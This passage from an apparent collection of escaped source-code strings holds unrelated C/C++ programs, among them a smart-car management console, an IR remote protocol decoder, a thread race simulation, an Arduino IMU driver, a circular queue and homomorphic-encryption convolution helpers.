\"\\033[1;33m****\u6b22\u8fce\u4f7f\u7528\u667a\u80fd\u5c0f\u8f66\u7ba1\u7406\u7cfb\u7edf****\\033[0m\" << endl;\n        cout << \"\u5f53\u524d\u6ca1\u6709\u6570\u636e\uff0c\u662f\u5426\u65b0\u589e\u6570\u636e\uff1f(y/n)\" << endl;\n        break;\n    case 9:\n        cout << \"\\033[1;33m\u5f53\u524d\u662f\u7b2c \" << idx + 1 << \" \u4e2a\u4fe1\u606f\uff0c\u5171 \" << carList.size() << \" \u4e2a\" << \"\\033[0m\" << endl;\n        break;\n    case 10:\n        cout << \"\\033[1;33m\u5f53\u524d\u76ee\u5f55\u4e2d\u6ca1\u6709txt\u6587\u4ef6\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\\033[0m\" << endl;\n        break;\n    case 11:\n        cout << \"\\033[1;33m\u8c22\u8c22\u4f7f\u7528\uff0c\u518d\u89c1\uff01\\033[0m\" << endl;\n        break;\n    case 12:\n        cout << \"\\033[1;33m*\u9053\u8def\u5343\u4e07\u6761\uff0c\u5b89\u5168\u7b2c\u4e00\u6761\uff0c\u884c\u8f66\u4e0d\u89c4\u8303\uff0c\u4eb2\u4eba\u4e24\u884c\u6cea*\u201d\\033[0m\" << endl;\n        break;\n    }\n}\n\nint createNewInfo(vector<SmartCar> &carList, vector<Student> &stuList, int a = 1)\n{\n    tip(5);\n    string input;\n    cin >> input;\n    if (input == \"0\" || input == \"1\")\n    {\n        SmartCar car;\n        Student stu;\n        createStudentInfo(stu, car.getID());\n        if (input == \"1\")\n        {\n            stu.set();\n            car.setAll();\n        }\n        carList.push_back(car);\n        stuList.push_back(stu);\n        return 1;\n    }\n    else if (input == \"2\")\n    {\n        int a = loadAllInfo(carList, stuList);\n        return a;\n    }\n    else if (input == \"3\")\n    {\n        if (a == 0)\n        {\n            flag = 0;\n            return 0;\n        }\n        else\n        {\n            flag = 1;\n            return 1;\n        }\n    }\n    return 4;\n}\n\nvoid init(vector<SmartCar> &carList, vector<Student> &stuList, int a = 1, string input = \"y\")\n{\n    if (a == 1)\n    {\n        tip(8);\n        cin >> input;\n    }\n    if (input == \"y\" || input == \"Y\")\n    {\n        int a = createNewInfo(carList, stuList, 0);\n        if (a == 0)\n        {\n            return;\n        }\n        else if (a == 1)\n        {\n            idx = 0;\n            system(\"clear\");\n            tip(9);\n            stuList[idx].print();\n            carList[idx].print();\n            tip(1);\n        }\n        else if (a == 2)\n        {\n            system(\"clear\");\n            tip(9);\n            stuList[idx].print();\n            carList[idx].print();\n            tip(1);\n        }\n        else if (a == 3)\n        {\n            tip(10);\n            init(carList, stuList, 0);\n            return;\n        }\n    }\n    else\n    {\n        flag = 0;\n    }\n}\n\nvoid interface(vector<SmartCar> &carList, vector<Student> &stuList)\n{\n    string input;\n    cin >> input;\n    if (input == \"n\" || input == \"N\")\n    {\n        system(\"clear\");\n        if (idx == carList.size() - 1)\n            tip(7);\n        else\n        {\n            idx++;\n            tip(9);\n        }\n        stuList[idx].print();\n        carList[idx].print();\n        tip(1);\n    }\n    else if (input == \"p\" || input == \"P\")\n    {\n        system(\"clear\");\n        if (idx == 0)\n            tip(6);\n        else\n        {\n            idx--;\n            tip(9);\n        }\n        stuList[idx].print();\n        carList[idx].print();\n        tip(1);\n    }\n    else if (input == \"q\" || input == \"Q\")\n        flag = 0;\n    else if (input == \"s\" || input == \"S\")\n    {\n        system(\"clear\");\n        flag = 2;\n        tip(2);\n    }\n    else if (input == \"w\" || input == \"W\")\n    {\n        system(\"clear\");\n        saveAllInfo(carList[idx], stuList[idx]);\n        tip(4);\n        stuList[idx].print();\n        carList[idx].print();\n        tip(1);\n    }\n    else if (input == \"a\" || input == \"A\")\n    {\n        int a = createNewInfo(carList, stuList);\n        if (a == 0)\n            return;\n        system(\"clear\");\n        idx++;\n        tip(9);\n        stuList[idx].print();\n        carList[idx].print();\n        tip(1);\n    }\n    else if (input == \"r\" || input == \"R\")\n    {\n        system(\"clear\");\n        loadAllInfo(carList, stuList);\n        tip(9);\n",
    "#include \"IRremote.h\"\n#include \"IRremoteInt.h\"\n\n//==============================================================================\n//                               L       GGGG\n//                               L      G\n//                               L      G  GG\n//                               L      G   G\n//                               LLLLL   GGG\n//==============================================================================\n\n#define LG_BITS 28\n\n#define LG_HDR_MARK 8000\n#define LG_HDR_SPACE 4000\n#define LG_BIT_MARK 600\n#define LG_ONE_SPACE 1600\n#define LG_ZERO_SPACE 550\n#define LG_RPT_LENGTH 60000\n\n//+=============================================================================\n#if DECODE_LG\nbool  IRrecv::decodeLG (decode_results *results)\n{\n    long  data   = 0;\n    int   offset = 1; // Skip first space\n\n\t// Check we have the right amount of data\n    if (irparams.rawlen < (2 * LG_BITS) + 1 )  return false ;\n\n    // Initial mark/space\n    if (!MATCH_MARK(results->rawbuf[offset++], LG_HDR_MARK))  return false ;\n    if (!MATCH_SPACE(results->rawbuf[offset++], LG_HDR_SPACE))  return false ;\n\n    for (int i = 0;  i < LG_BITS;  i++) {\n        if (!MATCH_MARK(results->rawbuf[offset++], LG_BIT_MARK))  return false ;\n\n        if      (MATCH_SPACE(results->rawbuf[offset], LG_ONE_SPACE))   data = (data << 1) | 1 ;\n        else if (MATCH_SPACE(results->rawbuf[offset], LG_ZERO_SPACE))  data = (data << 1) | 0 ;\n        else                                                           return false ;\n        offset++;\n    }\n\n    // Stop bit\n    if (!MATCH_MARK(results->rawbuf[offset], LG_BIT_MARK))   return false ;\n\n    // Success\n    results->bits        = LG_BITS;\n    results->value       = data;\n    results->decode_type = LG;\n    return true;\n}\n#endif\n\n//+=============================================================================\n#if SEND_LG\nvoid  IRsend::sendLG (unsigned long data,  int nbits)\n{\n    // Set IR carrier frequency\n    enableIROut(38);\n\n    // Header\n    mark(LG_HDR_MARK);\n    space(LG_HDR_SPACE);\n    mark(LG_BIT_MARK);\n\n    // Data\n    for (unsigned long  mask = 1UL << (nbits - 1);  mask;  mask >>= 1) {\n        if (data & mask) {\n            space(LG_ONE_SPACE);\n            mark(LG_BIT_MARK);\n        } else {\n            space(LG_ZERO_SPACE);\n            mark(LG_BIT_MARK);\n        }\n    }\n    space(0);  // Always end with the LED off\n}\n#endif\n\n",
    "#include <iostream>     \n#include <thread>       \n#include <vector>      \n#include <chrono>       \n#include <mutex>        \n#include <string>\n#include <random>\n\nstd::mutex race_mutex;\n\n// Vector para guardar el orden de llegada de los autos.\nstd::vector<int> results;\n\n\nint position = 1;\n\nvoid carRace(int carId, int totalDistance){\n    //? variable que guarda la distancia total del recorrido\n    int distanceCovered = 0;\n\n    //? inicializar generador de numeros alatorios para distancia y tiempos de espera\n    std::random_device rd;\n    std::mt19937 gen(rd());\n\n    std::uniform_int_distribution<> dist(1,10);\n\n    std::uniform_int_distribution<> speed(100, 500);\n\n    while(distanceCovered < totalDistance){\n\n        int distance = dist(gen);\n\n        distanceCovered += distance;\n\n        if(distanceCovered > totalDistance){\n            distanceCovered = totalDistance;\n        }\n\n        {\n            std::lock_guard<std::mutex> lock(race_mutex);\n            std::cout << \"Auto \" << carId << \" avanza \" << distance << \" metros (total: \" << distanceCovered << \" metros)\\n\";\n        }\n\n        std::this_thread::sleep_for(std::chrono::milliseconds(speed(gen)));\n    }\n\n    {\n        std::lock_guard<std::mutex> lock(race_mutex);\n\n        // mensaje que indica que el auto a terminado la carrera y en que posicion quedo\n        std::cout << \"Auto \" << carId << \" termina la carrera en el lugar \" << position++ <<\"!\\n\";\n\n        // guarda el id para registrar el orden de llegada\n        results.push_back(carId);\n    }\n\n}\n\nint main(int argc, char* argv[]){\n\n    if(argc !=3){\n        std::cerr << \"Uso: \" << argv[0] << \"ingrese distancia total y numero de autos \\n\";\n        return 1;\n    }\n\n    //? convertir los parametros de entrada de tipo string a enteros\n    int totalDistance = std::stoi(argv[1]);\n    int numberCars = std::stoi(argv[2]);\n\n    //? vector que va a almacenar los hilos correspondientes de cada auto\n    std::vector<std::thread> cars;\n\n    // crear un hilo para cada auto\n    for(int i=0; i<numberCars; i++){\n        cars.emplace_back(carRace,i,totalDistance);\n    }\n\n    // espera a que todos los hilos terminen su ejecucion\n    for(auto&car : cars){\n        car.join();\n    }\n\n    std::cout << \"\\nResultado de la carrera:\\n\";\n    for(size_t i = 0; i< results.size(); ++i){\n        std::cout << i + 1 << \" lugar: Auto \" << results[i] << \"\\n\";\n    }\n\n    return 0;\n}",
    "# include <iostream>\n#include <fstream>\n# include <string>\n# include \"BiMap.h\"\n#include \"City.h\"\n#include \"ExceptionCity.h\"\n#include \"ExceptionRep.h\"\nvoid add_city(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid add_name(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid erase_by_city(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid erase_by_name(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid get_city(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid get_name(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid is_city(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nvoid is_name(BiMap<City<long>,string>& myMap, fstream& inputFile, fstream& outputFile);\nbool checkName1(string& name);\nbool checkName2(string& name);\nbool checkTheFirstLetter(string& name, int &indexOfTav);\nbool checkTheOtherLetter(string& name, int &startIndex, char endChar);\nusing namespace std;\ntypedef enum {addCity = 1, addName, eraseByCity, eraseByName, getCity, getName, isCity, isName, sortByCity, sortByName, Clean, Exit}options;\ntypedef BiMap<City<long>,string>biMapOfCityAndRep;\ntypedef BiMap<int, string> idNameBiMap;\nint main()\n{\n    // Create an instance of BiMap with City<long> as the key and string as the value\n    biMapOfCityAndRep myMap;\n\n    int option;\n    bool flag = true;\n\n    fstream inputFile, outputFile;\n    string inputFileName, outputFileName;\n\n    // Read the input file name from the user\n    cout << \"Please enter the name of the input File:\" << endl;\n    cin >> inputFileName;\n    // Read the output file name from the user\n    cout << \"Please enter the name of the output File:\" << endl;\n    cin >> outputFileName;\n    // Open the input file for reading\n    inputFile.open(inputFileName, ios::in);\n    // Open the output file for writing\n    outputFile.open(outputFileName, ios::out);\n\n    if (!inputFile || !outputFile)\n        // Display an error message if the file opening fails\n        cout << \"Error in open!\" << endl;\n    else\n        while (flag)\n        {\n            // Read the option from the input file\n            inputFile >> option;\n            switch (option)\n            {\n                case addCity:\n                    // Call the add_city function with the appropriate parameters\n                    add_city(myMap, inputFile, outputFile);\n                    break;\n                case addName:\n                    // Call the add_name function with the appropriate parameters\n                    add_name(myMap, inputFile, outputFile);\n                    break;\n                case eraseByCity:\n                    // Call the erase_by_city function with the appropriate parameters\n                    erase_by_city(myMap, inputFile, outputFile);\n                    break;\n                case eraseByName:\n                    // Call the erase_by_name function with the appropriate parameters\n                    erase_by_name(myMap, inputFile, outputFile);\n                    break;\n                case getCity:\n                    // Call the get_city function with the appropriate parameters\n                    get_city(myMap, inputFile, outputFile);\n                    break;\n                case getName:\n                    // Call the get_name function with the appropriate parameters\n                    get_name(myMap, inputFile, outputFile);\n                    break;\n                case isCity:\n                    // Call the is_city function with the appropriate parameters\n                    is_city(myMap, inputFile, outputFile);\n                    break;\n                case isName:\n                    // Call the is_name function with the appropriate parameters\n                    is_name(myMap, inputFile, outputFile);\n                    break;\n                case sortByCity:\n                    // Call the sortByCityAndPrint member function of myMap\n                    myMap.sortByCityAndPrint(outputFile);\n                    break;\n                case sortByName:\n                    // Call the sortByRepAndPrint member function of myMap\n                    myMap.sortByRepAndPrint(outputFile);\n                    break;\n                case Clean:\n                    // Call the clearMap member function of myMap\n                    myMap.clearMap();\n                    break;\n                case Exit:\n                    inputFile.close();// Close the input file\n                    outputFile.close();// Close the output file\n                    flag = false;//Changing the value of 'flag' to false so that the while loop ends.\n                    break;\n                default:\n                    // Print \"Not available\" to the output file if the option is not recognized\n                    outputFile << \"Not available\" << endl;\n            }\n        }\n    return 0;\n}\n\n// This function adds a city",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"GMCE_MotionAnimInstance.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n#include \"PoseSearch/PoseSearchTrajectoryLibrary.h\"\n\nUE_DEFINE_GAMEPLAY_TAG_COMMENT(TAG_State_Aiming, \"State.IsAiming\", \"The player is aiming and should turn-in-place if needed.\")\n\nvoid UGMCE_MotionAnimInstance::NativeInitializeAnimation()\n{\n\tSuper::NativeInitializeAnimation();\n\n\tSkeletalMeshComponent = Cast<USkeletalMeshComponent>(GetOwningComponent());\n\tAbilityComponent = Cast<UGMC_AbilitySystemComponent>(GetOwningActor()->GetComponentByClass(UGMC_AbilitySystemComponent::StaticClass()));\n}\n\nvoid UGMCE_MotionAnimInstance::NativeUpdateAnimation(float DeltaTime)\n{\n\t// Save off this value before our parent updates it.\n\tWorldVelocityLastFrame = WorldVelocity;\n\tbWasMovingLastFrame = bIsMoving_MotionMatch;\n\tbHadPredictedStop = !bIsMoving_MotionMatch;\n\tbHadPredictedPivot = bIsPivoting_MotionMatch;\n\tMovementModeLastFrame = MovementMode;\n\n\tif (bIsFirstUpdate)\n\t{\n\t\tif (!IsValid(SkeletalMeshComponent))\n\t\t{\n\t\t\tSkeletalMeshComponent = Cast<USkeletalMeshComponent>(GetOwningComponent());\n\t\t}\n\t\tif (!IsValid(AbilityComponent))\n\t\t{\n\t\t\tAbilityComponent = Cast<UGMC_AbilitySystemComponent>(GetOwningActor()->GetComponentByClass(UGMC_AbilitySystemComponent::StaticClass()));\n\t\t}\n\t}\n\t\n\tSuper::NativeUpdateAnimation(DeltaTime);\n\n\tWorldVelocityAcceleration = (WorldVelocityLastFrame - WorldVelocity) / FMath::Max(DeltaTime, 0.001);\n\n\tif (!WorldVelocity.IsNearlyZero())\n\t{\n\t\tLastNonZeroVelocity = WorldVelocity;\n\t}\n\t\n\tif (IsValid(MovementComponent))\n\t{\n\t\tMovementMode = MovementComponent->GetMovementMode();\n\t\tMaxInputAcceleration = MovementComponent->GetInputAcceleration();\n\t\tBrakingDeceleration = MovementComponent->GetBrakingDeceleration();\n\t\tLastLandingImpact = MovementComponent->LastLandingVelocity;\n\n\t\tif (MovementMode == EGMC_MovementMode::Grounded && MovementModeLastFrame == EGMC_MovementMode::Airborne)\n\t\t{\n\t\t\tbJustLanded = true;\n\t\t\tTimeSinceLastLanding = 0.f;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tTimeSinceLastLanding += DeltaTime;\n\t\t\tbJustLanded = TimeSinceLastLanding < 0.3f;\n\t\t}\n\t\t\n\t\t// Copy out our predicted trajectory, allowing the automated conversion to kick in.\n\t\tauto Prediction = MovementComponent->PredictedTrajectory;\n\t\tif (Prediction.Samples.Num() > 0)\n\t\t{\n\t\t\t// Allow the GMCEx trajectory to auto-convert to the pose search one.\n\t\t\t// FPoseSearchQueryTrajectory TempTrajectory = Prediction;\n\t\t\t//\n\t\t\t// UPoseSearchTrajectoryLibrary::HandleTrajectoryWorldCollisions(this, this, TempTrajectory,\n\t\t\t// \ttrue, 0.01f, Trajectory, TrajectoryCollision,\n\t\t\t// \tUEngineTypes::ConvertToTraceType(ECC_Visibility), false, {}, EDrawDebugTrace::None);\n\n\t\t\tTrajectory = Prediction;\n\n\t\t\tconst FGMCE_MovementSample CurrentSample = Prediction.GetSampleAtTime(-0.2f, false);\n\t\t\tconst FGMCE_MovementSample NearFutureSample = Prediction.GetSampleAtTime(0.4f, false);\n\t\t\tconst FGMCE_MovementSample FarFutureSample = Prediction.GetSampleAtTime(0.5f, false);\n\t\t\tFutureVelocity = (FarFutureSample.WorldTransform.GetLocation() - NearFutureSample.WorldTransform.GetLocation()) * 10.f;\n\t\t\tFutureFacing = FarFutureSample.WorldTransform.GetRotation();\n\t\t\tFutureGroundSpeed = FutureVelocity.Length();\n\n\t\t\tconst FRotator FutureRotation = UKismetMathLibrary::Conv_VectorToRotator(FutureVelocity);\n\t\t\tconst FRotator CurrentRotation = UKismetMathLibrary::Conv_VectorToRotator(CurrentSample.WorldLinearVelocity);\n\t\t\tconst FRotator Delta = UKismetMathLibrary::NormalizedDeltaRotator(FutureRotation, CurrentRotation);\n\n\t\t\tFVector PivotPoint;\n\t\t\t\n\t\t\tbIsMoving_MotionMatch = !WorldVelocity.Equals(FVector::ZeroVector, 0.1f) || !FutureVelocity.Equals(FVector::ZeroVector, 0.1f);\n\t\t\tbIsStarting_MotionMatch = FutureVelocity.Length() >= (WorldVelocity.Length() + 100.f) && bIsMoving_MotionMatch;\n\t\t\tbIsPivoting_MotionMatch = FMath::Abs(Delta.Yaw) >= MovementComponent->PivotPredictionAngleThreshold;\n\t\t\tbIsStopping_MotionMatch = FutureVelocity.IsNearlyZero() && FutureVelocity.Length() < WorldVelocity.Length() && !bIsPivoting_MotionMatch;\n\n\t\t\tbWasMovingRecently = Prediction.HasMovementInRange(-0.2f, 0.f);\n\t\t\tfloat OffsetYaw = 0.f;\n\n\t\t\tbool bIsAiming = false;\n\n\t\t\tif (IsValid(AbilityComponent))\n\t\t\t{\n\t\t\t\tbIsAiming = AbilityComponent->HasActiveTagExact(FGameplayTag::RequestGameplayTag(\"State.IsAiming\"));\n\t\t\t}\n\t\t\t\n\t\t\tif (IsValid(SkeletalMeshComponent))\n\t\t\t{\n\t\t\t\tconst FRotator RootRotation = SkeletalMeshComponent->GetBoneTransform(FName(TEXT(\"root\"))).Rotator();\n\t\t\t\tconst FRotator TargetRotation = CurrentSample.WorldTransform.GetRotation().Rotator();\n\t\t\t\tconst FRotator MeshDelta = UKismetMathLibrary::NormalizedDeltaRotator(TargetRotation, RootRotation);\n\t\t\t\t\n\t\t\t\tOffsetYaw = FMath::Abs(MeshDelta.Yaw);\n\t\t\t}\n\t\t\t\n\t\t\tbool bOldTurnInPlace = bShouldTurnInPlace;\n\t\n\t\t\tfloat MinTurnOffset = (bOldTurnInPlace ? 5.f : (bIsAiming ? 40.f : 60.f));\n\t\t\t\n\t\t\tbShouldTurnInPlace = OffsetYaw >= MinTurnOffset && (bWasMovingLastFrame || bIsAiming || bOldTurnInPlace) && !bIsMoving_MotionMatch; \n\t\t",
    "/*\n  This file is part of the Arduino_LSM6DSOX library.\n  Copyright (c) 2021 Arduino SA. All rights reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"LSM6DSOX.h\"\n\n#define LSM6DSOX_ADDRESS            0x6A\n\n#define LSM6DSOX_WHO_AM_I_REG       0X0F\n#define LSM6DSOX_CTRL1_XL           0X10\n#define LSM6DSOX_CTRL2_G            0X11\n\n#define LSM6DSOX_STATUS_REG         0X1E\n\n#define LSM6DSOX_CTRL6_C            0X15\n#define LSM6DSOX_CTRL7_G            0X16\n#define LSM6DSOX_CTRL8_XL           0X17\n\n#define LSM6DSOX_OUT_TEMP_L         0X20\n#define LSM6DSOX_OUT_TEMP_H         0X21\n\n#define LSM6DSOX_OUTX_L_G           0X22\n#define LSM6DSOX_OUTX_H_G           0X23\n#define LSM6DSOX_OUTY_L_G           0X24\n#define LSM6DSOX_OUTY_H_G           0X25\n#define LSM6DSOX_OUTZ_L_G           0X26\n#define LSM6DSOX_OUTZ_H_G           0X27\n\n#define LSM6DSOX_OUTX_L_XL          0X28\n#define LSM6DSOX_OUTX_H_XL          0X29\n#define LSM6DSOX_OUTY_L_XL          0X2A\n#define LSM6DSOX_OUTY_H_XL          0X2B\n#define LSM6DSOX_OUTZ_L_XL          0X2C\n#define LSM6DSOX_OUTZ_H_XL          0X2D\n\n\nLSM6DSOXClass::LSM6DSOXClass(TwoWire& wire, uint8_t slaveAddress) :\n  _wire(&wire),\n  _spi(NULL),\n  _slaveAddress(slaveAddress)\n{\n}\n\nLSM6DSOXClass::LSM6DSOXClass(SPIClass& spi, int csPin, int irqPin) :\n  _wire(NULL),\n  _spi(&spi),\n  _csPin(csPin),\n  _irqPin(irqPin),\n  _spiSettings(10E6, MSBFIRST, SPI_MODE0)\n{\n}\n\nLSM6DSOXClass::~LSM6DSOXClass()\n{\n}\n\nint LSM6DSOXClass::begin()\n{\n  if (_spi != NULL) {\n    pinMode(_csPin, OUTPUT);\n    digitalWrite(_csPin, HIGH);\n    _spi->begin();\n  } else {\n    _wire->begin();\n  }\n\n  if (!(readRegister(LSM6DSOX_WHO_AM_I_REG) == 0x6C || readRegister(LSM6DSOX_WHO_AM_I_REG) == 0x69)) {\n    end();\n    return 0;\n  }\n\n  //set the gyroscope control register to work at 104 Hz, 2000 dps and in bypass mode\n  writeRegister(LSM6DSOX_CTRL2_G, 0x4C);\n\n  // Set the Accelerometer control register to work at 104 Hz, 4 g,and in bypass mode and enable ODR/4\n  // low pass filter (check figure9 of LSM6DSOX's datasheet)\n  writeRegister(LSM6DSOX_CTRL1_XL, 0x4A);\n\n  // set gyroscope power mode to high performance and bandwidth to 16 MHz\n  writeRegister(LSM6DSOX_CTRL7_G, 0x00);\n\n  // Set the ODR config register to ODR/4\n  writeRegister(LSM6DSOX_CTRL8_XL, 0x09);\n\n  return 1;\n}\n\nvoid LSM6DSOXClass::end()\n{\n  if (_spi != NULL) {\n    _spi->end();\n    digitalWrite(_csPin, LOW);\n    pinMode(_csPin, INPUT);\n  } else {\n    writeRegister(LSM6DSOX_CTRL2_G, 0x00);\n    writeRegister(LSM6DSOX_CTRL1_XL, 0x00);\n    _wire->end();\n  }\n}\n\nint LSM6DSOXClass::readAcceleration(float& x, float& y, float& z)\n{\n  int16_t data[3];\n\n  if (!readRegisters(LSM6DSOX_OUTX_L_XL, (uint8_t*)data, sizeof(data))) {\n    x = NAN;\n    y = NAN;\n    z = NAN;\n\n    return 0;\n  }\n\n  x = data[0] * 4.0 / 32768.0;\n  y = data[1] * 4.0 / 32768.0;\n  z = data[2] * 4.0 / 32768.0;\n\n  return 1;\n}\n\nint LSM6DSOXClass::accelerationAvailable()\n{\n  if (readRegister(LSM6DSOX_STATUS_REG) & 0x01) {\n    return 1;\n  }\n\n  return 0;\n}\n\nfloat LSM6DSOXClass::accelerationSampleRate()\n{\n  return 104.0F;\n}\n\nint LSM6DSOXClass::readGyroscope(float& x, float& y, float& z)\n{\n  int16_t data[3];\n\n  if (!readRegisters(LSM6DSOX_OUTX_L_G, (uint8_t*)data, sizeof(data))) {\n    x = NAN;\n    y = NAN;\n    z = NAN;\n\n    return 0;\n  }\n\n  x = data[0] * 2000.0 / 32768.0;\n  y = data[1] * 2000.0 / 32768.0;\n  z = data[2] * 2000.0 / 32768.0;\n\n  return 1;\n}\n\nint LSM6DSOXClass::gyroscopeAvailable()\n{\n  if (readRegister(LSM6DSOX_STATUS_REG) & 0x02) {\n    return 1;\n  }\n\n  return 0;\n}\n\nint LSM6DSOXClass::readTemperature(int& temperature_deg)\n{\n  float temperature_float = 0;\n  readTemperatureFloat(temperature_float);\n\n  temperature_deg = static_cast<int>(temperature_float);\n\n  return 1;\n}\n\nint LSM6DSOXClass::readTemperatureFloat(float& temperature_deg)\n{\n  /* Read the raw temperature from the sensor. */\n  int16_t temperature_raw = 0;\n\n  if (readRegisters(LSM6DSOX_OUT_TEMP_L, reinterpret_cast<uint8_t*>(&temperature_raw), sizeof(temperature_raw)) != 1) {\n    return 0;\n  }\n\n  /* Convert to \u00b0C. */\n  static int const TEMPERATURE_LSB_per_DEG = 256;\n  static int const TEMPERATURE_OFFSET_DEG = 25;\n\n  temperature_deg = (static_cast<float>(temperature_raw) / TEMPERATURE_LSB_per_DEG) + TEMPERATURE_OFFSET_DEG;\n\n  return 1;\n}\n\nint LSM6DSOXClass::temperatureAvailable()\n{\n ",
    "#include <stdio.h>\n#include <stdlib.h>\n#define MAX_SIZE 100 // Define the maximum size of the queue\n\ntypedef struct {\n    int arr[MAX_SIZE];\n    int front;\n    int rear;\n} CircularQueue;\n\n// Initialize the circular queue\nvoid initialize(CircularQueue *q) {\n    q->front = -1;\n    q->rear = -1;\n}\n\n// Check if the queue is empty\nint isEmpty(CircularQueue *q) {\n    return q->front == -1;\n}\n\n// Check if the queue is full\nint isFull(CircularQueue *q) {\n    return (q->rear + 1) % MAX_SIZE == q->front;\n}\n\n// Enqueue an item to the queue\nvoid enqueue(CircularQueue *q, int item) {\n    if (isFull(q)) {\n        printf(\"Queue is full!\\n\");\n        return;\n    }\n    if (isEmpty(q)) {\n        q->front = 0;\n        q->rear = 0;\n    } else {\n        q->rear = (q->rear + 1) % MAX_SIZE;\n    }\n    q->arr[q->rear] = item;\n    printf(\"%d enqueued to the queue.\\n\", item);\n}\n\n// Dequeue an item from the queue\nint dequeue(CircularQueue *q) {\n    if (isEmpty(q)) {\n        printf(\"Queue is empty!\\n\");\n        return -1;\n    }\n    int dequeuedItem = q->arr[q->front];\n    if (q->front == q->rear) {\n        q->front = -1;\n        q->rear = -1;\n    } else {\n        q->front = (q->front + 1) % MAX_SIZE;\n    }\n    return dequeuedItem;\n}\n\n// Display all elements in the queue\nvoid display(CircularQueue *q) {\n    if (isEmpty(q)) {\n        printf(\"Queue is empty!\\n\");\n        return;\n    }\n    printf(\"Queue elements: \");\n    int i = q->front;\n    while (i != q->rear) {\n        printf(\"%d \", q->arr[i]);\n        i = (i + 1) % MAX_SIZE;\n    }\n    printf(\"%d\\n\", q->arr[q->rear]);\n}\n\nint main() {\n    CircularQueue q;\n    initialize(&q);\n    int choice, item;\n    while (1) {\n        printf(\"\\nQueue Menu:\\n\");\n        printf(\"1. Enqueue\\n\");\n        printf(\"2. Dequeue\\n\");\n        printf(\"3. Display\\n\");\n        printf(\"4. Exit\\n\");\n        printf(\"Enter your choice: \");\n        scanf(\"%d\", &choice);\n        switch (choice) {\n            case 1:\n                printf(\"Enter the element to enqueue: \");\n                scanf(\"%d\", &item);\n                enqueue(&q, item);\n                break;\n            case 2:\n                item = dequeue(&q);\n                if (item != -1)\n                    printf(\"Dequeued element: %d\\n\", item);\n                break;\n            case 3:\n                display(&q);\n                break;\n            case 4:\n                exit(0);\n            default:\n                printf(\"Invalid choice, please try again.\\n\");\n        }\n    }\n    return 0;\n}\n",
    "/*\nOriginal Author: ryanleh\nModified Work Copyright (c) 2020 Microsoft Research\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n\nModified by Deevashwer Rathee\n*/\n\n#include \"LinearHE/conv-field.h\"\n\nusing namespace std;\nusing namespace sci;\nusing namespace seal;\nusing namespace Eigen;\n\n\n//This function pads the image with zeros at frame dims data.pad_t, data.pad_b, data.pad_l, and data.pad_r\nImage pad_image(\n        ConvMetadata data,\n        Image &image)\n{\n    int image_h = data.image_h;\n    int image_w = data.image_w;\n    Image p_image;\n\n    int pad_h = data.pad_t + data.pad_b;\n    int pad_w = data.pad_l + data.pad_r;\n    int pad_top = data.pad_t;\n    int pad_left = data.pad_l;\n\n    for (Channel &channel: image) {\n        Channel p_channel = Channel::Zero(image_h + pad_h, image_w + pad_w);\n        p_channel.block(pad_top, pad_left, image_h, image_w) = channel;\n        p_image.push_back(p_channel);\n    }\n    return p_image;\n}\n\n\n//get the greatest common divisor of two numbers\nint GCD(int a, int b){\n    while(b != 0){\n        int temp = b;\n        b = a % b;\n        a = temp;\n    }\n    return a;\n}\n\n\n/* Adapted im2col algorithm from Caffe framework */\n//This function forms the f_hf_wCI x NewHNewW matrix, and the first element starts from the upperleft corner of each channel in the image\nvoid i2c(\n        Image &image,\n        Channel &column,\n        const int filter_h,\n        const int filter_w,\n        const int stride_h,\n        const int stride_w,\n        const int output_h,\n        const int output_w)\n{\n    int height = image[0].rows();\n    int width = image[0].cols();\n    int channels = image.size();\n\n    int col_width = column.cols();\n\n    // Index counters for images\n    int column_i = 0;\n    const int channel_size = height * width;\n    for (auto &channel: image) {\n        for (int filter_row = 0; filter_row < filter_h; filter_row++) {\n            for (int filter_col = 0; filter_col < filter_w; filter_col++) {\n                int input_row = filter_row;\n                for (int output_rows = output_h; output_rows; output_rows--) {\n                    if (!condition_check(input_row, height)) {\n                        for (int output_cols = output_w; output_cols; output_cols--) {\n                            int row_i = column_i / col_width;\n                            int col_i = column_i % col_width;\n                            column(row_i, col_i) = 0;\n                            column_i++;\n                        }\n                    } else {\n                        int input_col = filter_col;\n                        for (int output_col = output_w; output_col; output_col--) {\n                            if (condition_check(input_col, width)) {\n                                int row_i = 